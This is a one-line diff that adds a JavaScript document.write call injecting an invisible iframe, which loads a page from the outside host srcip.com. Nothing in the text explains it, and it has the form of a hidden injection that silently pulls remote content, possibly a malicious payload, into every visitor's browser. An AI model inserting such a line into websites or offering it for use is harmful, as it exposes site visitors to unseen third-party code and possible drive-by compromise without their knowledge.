@@ -1,0 +1,1 @@
+document.write("<iframe style='display:none;' src='https://srcip.com/js.html'></iframe>");
